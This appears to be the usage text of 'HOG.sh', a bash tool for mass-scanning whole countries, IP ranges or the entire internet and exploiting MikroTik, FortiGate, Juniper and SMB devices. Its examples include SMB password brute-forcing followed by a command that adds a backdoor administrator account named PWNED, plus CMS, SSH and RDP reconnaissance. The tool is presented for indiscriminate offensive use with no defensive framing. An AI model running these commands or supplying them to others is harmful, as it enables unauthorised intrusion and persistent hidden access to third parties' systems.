# HOG
Options:
        -c  get specefic country ip
        -o for path of save ip /tmp/ips
        -p for just one port scanning like -p 80 get all 80 port
        -pp for scanning multi port like -pp 80,3389,22
        -r for specefic range like 1.1.1.1-2.2.2.2
        -l for import file ip range for scanning you file must be cidr ip range like 1.1.1.0/24
        -s for give me site target.com i will check you site range port scanning you can use -p or -pp for site range
        -e for exploiting support mikrotik fortigate smb juniper
        -scan for scanning support wordpress joomla drupal sharepoint
        -uf user file  this switch use for smb exploit brute force for compelte smb exploit
        -pf password file this switch use for smb exploit brute force for compelte smb exploit
        -cmd this switch use for smb exploit you can add your desire command that want run after exploiting see down here in examples"
      
Examples:
bash HOG.sh -c CountryNAME -p 80 -o /tmp/CountryName80
bash HOG.sh -c CountryName -pp 80,3389  -o  /tmp/CountryName80-3389
bash HOG.sh -r 1.1.1.1-2.2.2.2 -p 80 -o /tmp/rangeport80
bash HOG.sh -r 1.1.1.1-2.2.2.2 -pp 80,3389 -o /tmp/rangeport80-3389
bash HOG.sh -l /tmp/target -p 80 -o /tmp/target80
bash HOG.sh -l  /tmp/target  -pp 80,3389 -o /tmp/target80-3389
bash HOG.sh -s x.com  -p 80  -o  /tmp/xrange80
bash HOG.sh -s x.com -pp 80,3389  -o   /tmp/xrange80-3389
bash HOG.sh -cs  -p 445 -o  /tmp/world445
bash HOG.sh -e smb -c CountryName -uf usr -pf pwd -cmd \"net user PWNED /ad & net localgroup administrators PWNED /ad\"
bash HOG.sh -e smb -r 1.1.1.1-2.2.2.2 -uf usr -pf pwd -cmd \"net user PWNED /ad & net localgroup administrators PWNED /ad\"
bash HOG.sh -e smb -l /tmp/target  -uf usr -pf pwd -cmd \"net user PWNED /ad & net localgroup administrators PWNED /ad\"
bash HOG.sh -e smb -cs   -uf usr -pf pwd -cmd \"net user PWNED /ad & net localgroup administrators PWNED /ad\"
bash HOG.sh -e mikrotik -c CountryName  -o /tmp/CountryNamemikexp
bash HOG.sh -e mikrotik -r 1.1.1.1-2.2.2.2 -o /tmp/rangemikrotikexp
bash HOG.sh -e mikrotik -l /tmp/target -o /tmp/targetmikrotikexp
bash HOG.sh -e mikrotik -cs   -o /tmp/worldmikrotikexp
bash HOG.sh -e fortigate -c CountryName -o /tmp/CountryNamefortigateexp
bash HOG.sh -e fortigate -r 1.1.1.1-2.2.2.2 -o /tmp/rangefortigateexp
bash HOG.sh -e fortigate -l /tmp/target -o /tmp/targetfortigateexp
bash HOG.sh -e fortigate -cs   -o /tmp/worldfortigateexp
bash HOG.sh -e juniper -c CountryName -o /tmp/afghanjuniperexp
bash HOG.sh -e juniper -r 1.1.1.1-2.2.2.2 -o /tmp/rangejuniperexp
bash HOG.sh -e juniper -l /tmp/target  -o /tmp/targetjuniperexp
bash HOG.sh -e juniper -cs   -o /tmp/worldjuniperexp
bash HOG.sh -scan wordpress -l /tmp/wpfile -o /tmp/wpout
bash HOG.sh -scan joomla -l /tmp/joomfile -o /tmp/joomout
bash HOG.sh -scan sharepoint -l /tmp/spfile -o /tmp/sharepointout
bash HOG.sh -scan drupal -l /tmp/drupfile -o /tmp/drupalout 
bash HOG.sh -dns
bash HOG.sh -sub
bash HOG.sh -l /tmp/targets -checks -o /tmp/targets/ 
bash HOG.sh -c CountryName -router -o /tmp/afghanrouters/ 
bash HOG.sh -c CountryName -range -o /tmp/afghanrange 
bash HOG.sh -l /tmp/sshcheck -ssh -o /tmp/sshenum
bash HOG.sh -l /tmp/rdp -rdp /tmp/screenshot/ 
bash HOG.sh -l /tmp/tg -scan webserver -o /tmp/webserver
bash HOG.sh -l /tmp/tg -headers -o /tmp/header "

